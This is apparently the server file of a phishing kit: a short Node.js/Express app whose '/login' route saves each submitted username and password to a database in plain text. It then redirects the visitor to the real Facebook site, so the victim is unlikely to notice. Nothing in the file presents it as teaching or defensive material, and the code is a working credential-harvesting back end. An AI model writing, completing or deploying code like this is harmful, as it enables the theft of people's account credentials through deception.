const express = require("express");
const app = express();
const User = require("./model/user");
const db = require("./model/db");
const morgan = require("morgan");
var bodyParser = require("body-parser");
app.use(morgan("dev"));
app.set("view engine", "ejs");
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static(__dirname + "/partial"));
console.log(app.get("views"));
const PORT = process.env.PORT || 3000;
app.get("/", (req, res) => {
  res.render("index");
  console.log(req.body);
});
app.post("/login", (req, res) => {
  // create new use model
  var temp = new User({
    username: req.body.username,

    password: req.body.password,
  });

  // insert data into database
  temp.save(function (error, result) {
    // check error
    if (error) {
      return res.json({
        status: false,
        message: "DB Insert Fail...",
        error: error,
      });
    }

    // Everything OK
    // return res.json({
    //   status: true,
    //   message: " Success...",
    //   //   result: result,
    // });
    res.redirect("https://www.facebook.com/");
  });
});

app.listen(PORT, () => {
  console.log(`server is running at port ${PORT}`);
});
